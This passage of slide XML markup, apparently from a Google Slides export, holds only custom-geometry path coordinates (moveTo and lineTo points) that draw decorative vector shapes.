                  <a:lnTo>
                    <a:pt x="17131" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16764" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16397" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16177" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16031" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15480" y="7888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15004" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14563" y="6824"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14160" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13830" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="4990"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12803" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="2936"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11959" y="2349"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="2092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="1982"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="1872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="1872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="1982"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="2202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="2349"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="4660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="7044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="8915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="1395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="1652"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="1762"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="1762"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="1652"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="38"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="1"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="15554" y="12546"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="15480" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15224" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="12913"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="12950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="12803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="12803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14563" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="13720"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="13867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="14087"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="14087"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="14050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14893" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="13573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15700" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15774" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15847" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15884" y="13830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15921" y="13757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15921" y="13647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15921" y="13573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15847" y="13500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15407" y="13170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15480" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15664" y="12803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15737" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15774" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15811" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15811" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15774" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15664" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15554" y="12546"/>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3" name="Google Shape;303;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6844475" y="1037625"/>
              <a:ext cx="414525" cy="389750"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="16581" h="15590" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="13793" y="2568"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14123" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14086" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13683" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13720" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="2568"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9428" y="3705"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9831" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="3705"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5283" y="3668"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6383" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="3668"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13096" y="2494"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13023" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="3191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13243" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13243" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12913" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="2494"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2605" y="6713"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2678" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="7226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="6713"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8364" y="6529"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8547" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="7226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="6529"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3155" y="3191"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3595" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="3191"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11005" y="6199"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12289" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11885" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="6199"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7264" y="8180"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7410" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="8180"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8181" y="5979"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7997" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="7226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="6419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="5979"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5063" y="7080"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5246" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="7080"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7887" y="4732"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9171" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="9647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="10674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="9537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="5722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="4732"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11152" y="9171"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11225" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="9171"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12729" y="7153"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13243" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15113" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15480" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15810" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16067" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16251" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16177" y="11041"/>
                  </a:lnTo>
